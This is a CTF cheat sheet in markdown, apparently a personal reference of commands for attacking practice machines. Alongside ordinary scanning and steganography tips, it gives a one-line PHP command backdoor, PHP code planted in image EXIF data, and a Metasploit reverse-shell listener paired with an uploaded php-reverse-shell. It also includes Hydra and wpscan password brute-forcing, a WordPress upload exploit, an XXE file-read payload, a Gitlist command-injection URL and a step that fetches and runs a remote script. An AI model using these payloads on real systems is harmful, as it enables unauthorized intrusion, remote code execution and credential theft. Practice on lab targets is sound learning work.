# CTF  -- [CTF AWESOME](https://github.com/apsdehal/awesome-ctf)
Steps to follow when participating to CTF

#### [Collaborative markdown notes](https://hackmd.io)

## See all opened ports, [here](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)

```bash
# All ports
nmap -p- 192.168.1.1
# This may detect more things, takes longer: Detects if ftp is vulnerable
nmap -A 192.168.1.1

nmap -sV -A 192.168.1.1
 
```

### Connect to a specific port
```bash
nc -n 192.168.0.157 13337

```

## More info about the website:
```bash
whatweb http://192.168.0.157:80

Output:
http://192.168.0.157:80 [200 OK] Apache[2.4.27], Country[RESERVED][ZZ], HTML5, HTTPServer[Fedora Linux][Apache/2.4.27 (Fedora)], IP[192.168.0.157], Title[Morty's Website]

```

## Dirbuster

```bash
dirbuster

wordlist: /usr/share/dirbuster/wordlists
```

## dirsearch
https://github.com/maurosoria/dirsearch

```bash
./dirsearch -u host -e html,php,txt,cfg
```


### Scan website with nikto

```bash
nikto -h host [-port p]
```

### Scan wordpress site:

```bash
wpscan --url host --enumerate vp

# --enumerate vp: vulnerable plugins

wpscan --url 192.168.56.223/bull/ -r --enumerate u --enumerate vp --enumerate t --enumerate tt

# --enumerate u e= enumerate users

```


## Files in images [here](http://ctfs.github.io/resources/topics/steganography/file-in-image/README.html):

```bash
The terminating byte for a JPEG is FF D9 in hex

PK are the initials of Phil Katz, the inventor of the zip file
```

### Image on image [here](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)

```bash
#!/bin/bash -ex

wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
mkdir bin
mv stegsolve.jar bin/

# or to start it
java -jar Stegsolve.jar
```

### Find strings in image:
```bash
strings image.jpg
```

### Add php code in image

```bash
exiftool -Comment="<?php passthru($_GET’cmd’); _halt_compiler();" /root/picture.jpeg
```

### Copy binary data from a file to another

```bash
dd count=38508 skip=100 if=sss.jpeg of=out.jpeg bs=1

# copy bytes starting with position 100(in decimal, 100th byte), copy 38508 bytes
```

## Brute force passwords with HYDRA or wpscan

```bash
hydra -l elliot -P ~/fsocity.dic 10.0.2.4 http-post-form “/wp-login.php:log=elliot&pwd=^PASS^:ERROR”

Where:
    -l specifies the username
    -P specifies the dictionary file
    http-post-form is the authentication method being used

and,

“/wp-login.php:log=elliot&pwd=^PASS^:ERROR”

roughly parses to,

    /wp-login.php the login page to attack
    log=elliot is the username on the form
    pwd=^PASS^ substitutes the passwords from the dictionary file
    ERROR tells it what to look for if it fails
```

### Bruteforce [8 Point](https://0x00sec.org/t/metasploitable-1-walkthrough/3964)

 - Brute force ftp, ssh, mysql, postgreesql, etc....


### WPscan
```bash
wpscan -u 10.0.2.4 --wordlist ~/fsocity.dic --username elliot
```

### Generate wordlist based on the content from a website

```bash
 cewl [ -m 6 ]-w passwords.txt http://derpnstink.local/weblog/
 
 # [ -m 6 ] Minimum size 6
 
 # You can pass the through john's rules, here's a tutorial: http://netsec.ws/?p=457
 john --wordlist=passwords.txt --rules --stdout > words-john.txt
```


## Root escalation
```bash
sudo -

sudo -i

# Method 2
# once we obtain a terminal on the remote, we can run the linux-exploit-suggester.sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && \
  bash linux-exploit-suggester.sh
# This will give us root escalation methods for the current distro (e.g. C programs which can be compiled)
#    [+] [CVE-2016-4557] double-fdput()
#    [+] [CVE-2016-5195] dirtycow
#    [+] [CVE-2016-5195] dirtycow 2
```

## PHP

#### Shell one-line

https://gist.github.com/sente/4dbb2b7bdda2647ba80b

```php
<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

### Using reverse shell with metasploit

Kali has some reverse shells for php: `/usr/share/webshells/php`, ex: `php-reverse-shell.php`

Change in that script the following lines:

```php
$ip = '192.168.1.159';  // CHANGE THIS your IP, not VM ip
$port = 55555;       // CHANGE THIS your PORT(where the metasploit will listen)
```

Upload file to VM.

Open metasploit:

```bash
msfconsole

msf > use multi/handler
msf exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
# Output: payload => linux/x86/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.159
# Output: LHOST => 192.168.1.159
msf exploit(multi/handler) > set LPORT 55555
# Output: LPORT => 55555
msf exploit(multi/handler) > exploit
#
$ whoami
```

Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.

## Wordpress

### Plugin SlideShow < 1.4.7

Exploit WordPress using SlideShow Gallery Authenticated File Upload

```bash

mfsconsole

use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOST 192.168.1.74
set TARGETURI /weblog/
set WP_USER admin
set WP_PASSWORD admin
run

shell
```

### PCAP

Get information from a pcap

```bash
ngrep -I capture.pcap
```

### NC files

```bash
mcrypt -d the_wall.txt.nc
```

### Substitution solver: https://www.guballa.de/substitution-solver

Just in case ROT doesn't work.

This 
```
Sr Wrnrgir
Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg
dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv
KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.

```

Decodes to this:
```
Hi Dimitri
If you are reading this I might be not alive. I have place a backdoor in Blackmarket
workshop under /kgbbackdoor folder you must have to use
PassPass.jpg in order to get access.
```

### XXE injection

[Here](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection) is more.

```bash
curl -d "@req.xml" -X POST -k https://172.25.1.130:15988/pool/process.php

# The file "@req.xml"  containing this:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/teo/server" >]>
<root>
  <name>sebi</name>
  <tel></tel>
  <email>&xxe;</email>
  <password></password>
</root>
```

### Curl

#### Make a request with a different user agent

```bash
curl -A "Three-eyed-raven" -X GET http://192.168.1.191/raven.php

# -A user-agent
```

#### Run imap request: [Documentation](https://debian-administration.org/article/726/Performing_IMAP_queries_via_curl), [link2](https://gist.github.com/akpoff/53ac391037ae2f2d376214eac4a23634)

```bash
curl "imap://mail.7kingdoms.ctf/INBOX;UID=1" -v -k --user "olennatyrell@7kingdoms.ctf:H1gh.Gard3n.powah"
```

## DNS server

```bash
nslookup
> server 192.168.1.191
Default server: 192.168.1.191
Address: 192.168.1.191#53
# Query type
> set type=TXT
## Query
> winterfell.7kingdoms.ctf
Server:         192.168.1.191
Address:        192.168.1.191#53
## Query
> timef0rconqu3rs.7kingdoms.ctf

# Or you can use dig

dig @192.168.1.191  -t TXT timef0rconqu3rs.7kingdoms.ctf
dig @dns_server [query type] query
```

## PosgreeSQL

```bash
psql -h 192.168.1.191 -U robinarryn -d mountainandthevale

## Show tables
> \d

# Show definition of view flag
> \d+ flag

```

## Exploit Research

```bash
searchsploit [app]
searchsploit postgreesql
```


## Cryptography

### Common Modulus attack with extended Euclidean algorithm: [here](https://blog.0daylabs.com/2015/01/17/rsa-common-modulus-attack-extended-euclidean-algorithm/)


### Exploits

#### Gitlist
```bash
http://localhost/gitlist/my_repo.git/blame/master/""`whoami`
```

## WalkThroughs

 - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
 - [Seatle Ctf](https://medium.com/@DRX_Sicher/seattle-ctf-walkthrough-a2fb2bf9367c)
 - [Rickdiculouslyeasy](https://portunreachable.com/ctf-walkthrough-vulnhub-rickdiculouslyeasy-26da0981413a)


## Challenges

 - [HackTheBox](https://www.hackthebox.eu/)
 - [VulnHub](https://www.vulnhub.com/)
 - [SquareCTF](https://2018.squarectf.com/)
 - [Enigma](https://www.enigmagroup.org)
 - [Backdoor SDSLabs](https://backdoor.sdslabs.co/)
 - [Ringzer0CTF](https://ringzer0ctf.com)
 - [Metsploitable](https://0x00sec.org/t/metasploitable-1-walkthrough/3964)

## Helpful links

- [CTFTime](https://ctftime.org/)
- [captf.com/practice-ctf](http://captf.com/practice-ctf/)
- [wechall](https://www.wechall.net/)
- [Reddit post](https://www.reddit.com/r/netsecstudents/comments/31uql2/any_hackthissiteorg_alternatives/)
